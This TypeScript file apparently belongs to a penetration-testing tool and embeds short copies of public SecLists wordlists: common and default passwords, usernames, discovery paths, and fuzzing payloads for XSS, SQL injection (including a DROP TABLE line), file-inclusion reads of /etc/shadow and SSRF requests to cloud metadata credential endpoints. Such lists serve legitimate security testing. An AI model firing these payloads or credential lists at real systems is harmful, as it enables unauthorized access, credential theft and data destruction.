// src/data/wordlists.ts
// Embedded mini wordlists — local fallback for /api/arsenal/wordlist.
// Each list contains the most actionable entries from SecLists.
// Used when GitHub is unreachable. 50–80 entries per list.

export const LOCAL_WORDLISTS: Record<string, string> = {
  "Passwords/Common-Credentials/10k-most-common.txt": `123456
password
123456789
12345678
12345
1234567
1234567890
qwerty
abc123
password1
111111
123123
admin
letmein
welcome
monkey
dragon
master
login
passw0rd
654321
sunshine
princess
solo
qwertyuiop
starwars
shadow
michael
superman
batman
trustno1
iloveyou
jessica
987654321
daniel
football
pass
pass123
baseball
access
1q2w3e4r
admin123
password123
changeme
secret
guest
root
toor
test
default`,

  "Passwords/Common-Credentials/top-20-common-SSH-passwords.txt": `123456
password
12345
12345678
qwerty
123456789
1234
baseball
dragon
football
1234567
monkey
letmein
abc123
111111
mustang
access
shadow
master
michael`,

  "Passwords/Default-Credentials/default-passwords.csv": `Username,Password
admin,admin
admin,password
admin,1234
admin,12345
admin,admin123
root,root
root,toor
root,password
root,
admin,
guest,guest
user,user
operator,operator
administrator,administrator
administrator,password
admin,pass
admin,Admin
admin,changeme
admin,default
cisco,cisco
ubnt,ubnt
pi,raspberry
netgear,password
support,support`,

  "Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt": `password
12345678
123456789
qwerty123
12341234
password1
abc123456
iloveyou1
sunshine1
princess1
football1
superman1
welcome1
654321
1q2w3e4r5t
monkey123
letmein1
dragon123
master123
shadow123
qwertyuiop
trustno1
baseball1
michael1
jessica1
asdfghjkl
zxcvbnm123
starwars1
password12
1234567890`,

  "Discovery/DNS/subdomains-top1million-5000.txt": `www
mail
ftp
localhost
webmail
smtp
pop
ns1
webdisk
ns2
cpanel
whm
autodiscover
autoconfig
m
imap
test
ns
blog
pop3
dev
www2
admin
forum
news
vpn
ns3
mail2
new
mysql
old
lists
support
mobile
mx
static
docs
beta
shop
staging
app
api
cdn
media
video
portal
remote
store
help
demo
img
images`,

  "Discovery/Web-Content/common.txt": `index.html
index.php
admin
login
wp-admin
.htaccess
robots.txt
sitemap.xml
config.php
wp-login.php
wp-config.php
backup
admin.php
administrator
phpmyadmin
db
test
upload
uploads
images
css
js
api
include
includes
src
assets
static
media
files
data
log
logs
error
setup
install
register
profile
user
users
account
dashboard
panel
manager
manage
phpinfo.php
info.php
README.md
LICENSE
.env
.git
.svn`,

  "Discovery/Web-Content/api/api-endpoints.txt": `/api
/api/v1
/api/v2
/api/v3
/api/users
/api/user
/api/admin
/api/auth
/api/login
/api/logout
/api/register
/api/token
/api/refresh
/api/health
/api/status
/api/ping
/api/info
/api/docs
/api/swagger
/api/graphql
/api/rest
/api/public
/api/private
/api/search
/api/upload
/api/download
/api/config
/api/settings
/api/profile
/api/account
/api/dashboard
/api/data
/api/export
/api/import
/api/reports
/api/analytics
/api/notifications
/api/messages
/api/payments`,

  "Discovery/Web-Content/directory-list-2.3-small.txt": `index
images
download
2006
news
crack
serial
warez
full
12
contact
about
search
spacer
privacy
index2
12
advertise
navbar
screen
login
includes
admin
js
products
blog
stats
css
advertise
cgi-bin
upload
downloads
tpl_c
uploads
tools
1
scripts
ads
inc
media
members
img
docs
forum
html
content
cache
static
source
info
backup`,

  "Usernames/top-usernames-shortlist.txt": `root
admin
test
guest
info
adm
mysql
user
administrator
oracle
ftp
pi
puppet
ansible
ec2-user
vagrant
azureuser
ubuntu
deploy
operator
service
nagios
backup
www-data
daemon
bin
nobody
mail
news
syslog
ubuntu
centos
ec2-user`,

  "Usernames/Names/names.txt": `michael
jennifer
james
mary
robert
patricia
john
linda
david
barbara
william
elizabeth
richard
susan
joseph
jessica
thomas
sarah
charles
karen
christopher
lisa
daniel
nancy
matthew
betty
anthony
margaret
mark
sandra
donald
ashley
steven
emily
paul
kimberly
andrew
donna
kenneth
carol
george
ruth
joshua
sharon
kevin
michelle
brian`,

  "Fuzzing/XSS/XSS-Jhaddix.txt": `<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(1)
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select onchange=alert(1)><option>1</option><option>2</option></select>
<iframe src="javascript:alert(1)">
"><script>alert(1)</script>
'><script>alert(1)</script>
<ScRiPt>alert(1)</ScRiPt>
<script>alert(document.cookie)</script>
<img src="x" onerror="alert(document.domain)">
<svg><script>alert(1)</script></svg>
<math><mtext></mtext><mglyph><image href="x" onerror="alert(1)"></image></mglyph></math>
%3Cscript%3Ealert(1)%3C%2Fscript%3E
&lt;script&gt;alert(1)&lt;/script&gt;
<a href="javascript:alert(1)">click</a>
<div onmouseover="alert(1)">hover</div>
<button onclick="alert(1)">click</button>
{{7*7}}
${7*7}
<% = 7*7 %>`,

  "Fuzzing/SQLi/Generic-SQLi.txt": `'
''
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
1' ORDER BY 1--+
1' ORDER BY 2--+
1' ORDER BY 3--+
1' UNION SELECT NULL--
1' UNION SELECT NULL,NULL--
1' UNION SELECT NULL,NULL,NULL--
1 UNION SELECT 1,2,3--
1; DROP TABLE users--
admin'--
admin' #
' OR 1=1--
' OR 1=1#
' OR 1=1/*
') OR '1'='1
') OR ('1'='1
1' AND SLEEP(5)--
1; WAITFOR DELAY '0:0:5'--
' AND 1=1--
' AND 1=2--
1 AND 1=1
1 AND 1=2
1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--`,

  "Fuzzing/LFI/LFI-gracefulsecurity-linux.txt": `../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/resolv.conf
/proc/version
/proc/self/environ
/proc/self/cmdline
../etc/shadow
../../etc/shadow
/etc/mysql/my.cnf
/etc/php.ini
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/auth.log
..%2Fetc%2Fpasswd
..%252Fetc%252Fpasswd`,

  "Fuzzing/SSRF.txt": `http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
http://169.254.169.254
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal
http://metadata.google.internal/computeMetadata/v1/
http://100.100.100.200/latest/meta-data/
http://192.168.0.1
http://10.0.0.1
http://172.16.0.1
file:///etc/passwd
file:///etc/hosts
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_INFO
ftp://anonymous@127.0.0.1
http://127.0.0.1:22
http://127.0.0.1:25
http://127.0.0.1:3306
http://127.0.0.1:5432
http://127.0.0.1:27017
http://127.0.0.1:6379`,
};

// Map from SecLists path → local data key
export function getLocalWordlist(path: string): string | null {
  return LOCAL_WORDLISTS[path] ?? null;
}